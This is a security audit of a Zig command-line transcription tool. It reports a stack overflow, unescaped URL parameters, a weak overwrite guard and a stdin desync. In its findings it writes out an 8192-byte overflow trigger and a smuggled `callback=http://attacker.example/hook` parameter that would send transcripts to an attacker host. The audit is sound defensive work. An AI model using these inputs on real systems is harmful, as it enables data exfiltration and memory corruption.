# CLI and input audit (baseline 1a21cf271f98)

## Scope
- Argument parsing and command dispatch: `src/main.zig` (`splitCommand`, `parseRecordArgs`), `src/formatcmd.zig` (`parseArgs`, `run`, `resolveSource`), `src/transcribecmd.zig` (`parseTranscribeArgs`, `run`, `refineTranscript`), `src/sharecmd.zig` (`parseArgs`, `resolvePath`), `src/setupcmd.zig` (interactive prompts, `readLine`, `chooseProvider`, `chooseModelAndSave`).
- Untrusted-input-to-sink paths: CLI arguments reaching filesystem paths (`--out`, `--template`, selections), reaching the Deepgram HTTP request (`--language` in `src/transcribe.zig`), and reaching child-process argv (`src/llm.zig` `buildArgv`, `src/transcribe.zig` curl invocation).
- Terminal input decoding: `src/keys.zig` (`readKey`, `parseKey`, `sequenceComplete`, raw-mode enable/restore) and the cooked-mode line reader `setupcmd.readLine`.
- Session/router state: `src/audio_notes.zig` (`Session.start`/`poll`/`failed`, background job state).
- Supporting helpers read to verify bounds/validation: `src/library.zig` (`resolveName`, `recordingPath`, `homeRecordingsPath`), `src/llm.zig` (`validTemplateName`, `loadTemplate`, `templatesDirPath`, `buildArgv`), `src/record.zig` (`appendStr`, `durationNanoseconds`).
- Not inspected: the audio capture/codec pipeline, the update/self-upgrade downloader, the markdown renderer/viewport, and the full LLM-provider environment-variable plumbing in `llm.zig` beyond what argument-flow tracing required — these sit outside this node's CLI/input focus and are better covered by dedicated audit nodes.

## Summary
- critical: 1 · major: 2 · minor: 1

## FINDING-CLI-01: Unbounded `--out` copy overflows a fixed stack buffer in `rec transcribe`
- **Severity:** critical
- **Class:** security
- **Location:** `src/transcribecmd.zig:160-163`, sink defined at `src/record.zig:616-621`
- **Evidence:**
  ```
  var out_path_buf: [std.Io.Dir.max_path_bytes]u8 = undefined;
  var out_len: usize = 0;
  if (ta.out) |p| {
      record.appendStr(&out_path_buf, &out_len, p);
  } else {
  ```
  ```
  pub fn appendStr(buf: []u8, n: *usize, s: []const u8) void {
      for (s) |ch| {
          buf[n.*] = ch;
          n.* += 1;
      }
  }
  ```
- **Failure mode:** `ta.out` is the raw, attacker/user-controlled string following `--out` (parsed unbounded at `src/transcribecmd.zig:55-58`, no length cap). `appendStr` writes every byte of `p` into `out_path_buf` (`std.Io.Dir.max_path_bytes` = `PATH_MAX` = 4096 bytes on Linux) with no bounds check on `n.*` against `buf.len`. Running `rec transcribe --out "$(python3 -c "print('A'*8192)")"` writes past the end of the stack array `out_path_buf`. Every other fixed-size-buffer path join in this codebase (e.g. `formatcmd.zig`'s `--out` handling at `formatcmd.zig:225-232`, `library.recordingPath` at `library.zig:71-86`) bounds-checks before copying; this call site is the one place that does not.
- **Impact:** Stack buffer overflow reachable directly from a CLI argument on the `rec transcribe` command. In a safety-checked build this is a reachable runtime panic (denial of service on a legitimate invocation, e.g. a long absolute path or a scripted/automated caller); in a build without bounds checks it is stack memory corruption with attacker-controlled content, adjacent to the return address and other locals of `run`.
- **Suggested fix:** Bound the copy: return an error (matching the existing "usage" error path) when `p.len >= out_path_buf.len`, or use `std.fmt.bufPrint` the way `formatcmd.zig` already does for its `--out` join, which fails safely instead of overflowing.

## FINDING-CLI-02: `--language` is concatenated unescaped into the Deepgram request URL
- **Severity:** major
- **Class:** security
- **Location:** `src/transcribe.zig:21-34` (built from `src/transcribecmd.zig:51-54` and used at `src/transcribecmd.zig:176`)
- **Evidence:**
  ```
  pub fn buildListenUrl(buf: []u8, language: []const u8) []const u8 {
      std.debug.assert(buf.len >= listenUrlLen(language));
      var n: usize = 0;
      appendStr(buf, &n, listen_base);
      appendStr(buf, &n, listen_query_before_language);
      if (std.mem.eql(u8, language, "auto")) {
          appendStr(buf, &n, "detect_language=true");
      } else {
          appendStr(buf, &n, "language=");
          appendStr(buf, &n, language);
      }
      appendStr(buf, &n, listen_query_after_language);
      return buf[0..n];
  }
  ```
- **Failure mode:** `parseTranscribeArgs` (`src/transcribecmd.zig:51-54`) accepts any string after `--language` with no character restriction, and it flows unmodified into the query string built above with no URL-encoding of `&`, `#`, `%`, or other reserved characters. A value such as `rec transcribe --language "en&callback=http://attacker.example/hook"` inserts an additional, attacker-chosen query parameter into the live Deepgram `listen` request (Deepgram's prerecorded API accepts a `callback` webhook parameter), and any `&`-containing value at minimum overrides or appends parameters the code did not intend to send (`smart_format`, `punctuate`, `utterances`, `diarize_model`, `mip_opt_out`).
- **Impact:** A caller (or any automation/wrapper that forwards untrusted text into `rec transcribe --language`) can redirect Deepgram's transcription result to an arbitrary external endpoint or alter request behavior, without needing any other vulnerability — a request/response exfiltration path for recording content sent to Deepgram.
- **Suggested fix:** Validate `--language` against Deepgram's known language code syntax (e.g. `^[a-z]{2}(-[A-Z]{2})?$` or `auto`) in `parseTranscribeArgs`, or percent-encode the value before splicing it into the URL.

## FINDING-CLI-03: `rec format --out` overwrite guard is a raw string compare, not a path-equivalence check
- **Severity:** major
- **Class:** bug
- **Location:** `src/formatcmd.zig:211-219`
- **Evidence:**
  ```
  const out_path: []const u8 = blk: {
      if (fa.out) |p| {
          // Overwriting the input with the transformed text is never what
          // "save to this path" means.
          if (std.mem.eql(u8, p, source_path)) {
              ui.print(io, "format: --out não pode ser o próprio arquivo de entrada\n");
              return 1;
          }
          break :blk p;
      }
  ```
- **Failure mode:** `source_path` is whatever `resolveSource` (`formatcmd.zig:262-296`) produced — either the raw selection string as typed (direct-path case) or a path assembled from `recordings_path` (library-resolved case). The guard only rejects a byte-for-byte identical string. A `--out` value that names the exact same file through a different but valid spelling (a leading `./`, a different number of slashes, a relative path when the source was resolved as absolute, or vice versa) passes the check, and `std.Io.Dir.writeFile` (`formatcmd.zig:240-248`) then creates/truncates that path, silently overwriting the original transcript with the LLM's formatted output.
- **Impact:** Data loss of the source transcript with no confirmation and no error — the command reports success ("Documento salvo em ...") while destroying the input it just read.
- **Suggested fix:** Compare resolved/canonicalized paths (e.g. via `realpath`/`std.Io.Dir.cwd().realPathFile`) rather than raw strings before deciding whether `--out` targets the source file.

## FINDING-CLI-04: `setupcmd.readLine` desyncs stdin on an over-length line instead of discarding the remainder
- **Severity:** minor
- **Class:** robustness
- **Location:** `src/setupcmd.zig:343-358`
- **Evidence:**
  ```
  pub fn readLine(buf: []u8) ?[]const u8 {
      var n: usize = 0;
      while (n < buf.len) {
          var byte: [1]u8 = undefined;
          if (!keys.readByte(&byte[0])) {
              if (n == 0) return null;
              break;
          }
          if (byte[0] == '\n') break;
          if (byte[0] != '\r') {
              buf[n] = byte[0];
              n += 1;
          }
      }
      return buf[0..n];
  }
  ```
- **Failure mode:** every caller passes a small fixed buffer (`line_buf: [64]u8` for menu picks at `setupcmd.zig:89`, `[256]u8` for the Deepgram key at `setupcmd.zig:128`, `[128]u8`/`[200]u8` for model entry at `setupcmd.zig:221,224`). When the line on stdin is longer than the buffer, the `while (n < buf.len)` loop exits without ever consuming the terminating `\n` or the rest of the line; those leftover bytes remain queued on stdin. The *next* call to `readLine` (the following prompt) then reads starting from that leftover data instead of a fresh line, silently answering an unrelated prompt (e.g. harness pick, provider pick, or model pick) with garbage left over from the previous, too-long input.
- **Impact:** Interactive `rec setup` (and any non-interactive/piped invocation, since `readByte` works identically on a redirected stdin) can silently select an unintended harness, provider, or model when a user pastes or pipes a line longer than the receiving buffer — a state-consistency bug in a flow that decides where transcript content gets sent.
- **Suggested fix:** After the loop, if the line was truncated (last byte read was not `\n` and not EOF), keep reading and discarding bytes until `\n` or EOF before returning, so leftover input never leaks into the next prompt.

## Areas checked with no significant finding
- Child-process argv construction (`src/llm.zig` `buildArgv`, `src/transcribe.zig`'s curl invocation): every argument is passed as a discrete `argv` element via `std.process.spawn`/`std.process.run`, never through a shell string, so user-controlled values (model id, template content, file paths) cannot achieve shell/command injection.
- Template name handling (`llm.validTemplateName` at `src/llm.zig:333-342`, used by `formatcmd.parseArgs` at `formatcmd.zig:55`): restricted to `a-z0-9-_`, 1-64 bytes, which rules out path traversal (`..`, `/`) before the name ever reaches `loadTemplate`'s path join.
- Recording selection resolution (`library.resolveName` at `library.zig:168-184`, `library.recordingPath` at `library.zig:71-86`): numeric selections are bounds-checked against the scanned entry count; non-numeric selections must exactly match a scanned entry name (no partial/traversal match); `recordingPath` bounds-checks the destination buffer before every `@memcpy`.
- `main.zig` command dispatch (`splitCommand`, `parseRecordArgs`): every branch that takes positional/flag arguments checks `rest.len` or returns `.invalid` on an unrecognized flag or missing value; `--duration` parses through `std.fmt.parseFloat` and explicitly rejects `NaN`/negative values, and the accepted value is clamped downstream in `record.durationNanoseconds` (`record.zig:434-437`) before any float-to-integer conversion, so out-of-range or infinite durations cannot overflow.
- `keys.zig` escape-sequence decoding (`readKey`, `parseKey`, `sequenceComplete`): the read loop is bounded by the fixed 32-byte stack buffer (`len < buf.len`) and every slice into `seq` in `parseKey` is preceded by a length check (`seq.len < 3` returns `.none` before any `seq[2..]`/`seq[len-1]` indexing), so no out-of-bounds read is reachable from crafted or truncated terminal escape sequences. `readKey`'s `.none`/`.eof` paths both spend the full poll window (`burnWindow`), so a closed or always-readable stdin cannot spin the caller's tick loop.
- `audio_notes.zig` session/job state (`Session.start`, `poll`, `failed`): every background job outcome (spawn failure, non-zero exit, load failure) routes through `failed()`, which clears `job`/`want_format` consistently; `poll` only publishes documents on the UI thread, and a stale document is never presented as `.ready` for a job that in fact failed.
